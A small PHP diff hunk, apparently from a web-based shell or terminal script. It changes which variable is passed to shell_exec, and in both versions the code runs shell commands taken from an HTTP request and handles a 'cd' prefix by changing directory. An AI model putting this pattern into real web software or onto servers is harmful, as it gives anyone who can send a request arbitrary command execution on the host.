@@ -7,7 +7,7 @@
         chdir($path . '/' . substr($cmd, 3));
     } else{
         chdir($path);
-        $output = shell_exec($_POST['cmd']);
+        $output = shell_exec($cmd);
     }
 
     $dir = getcwd();
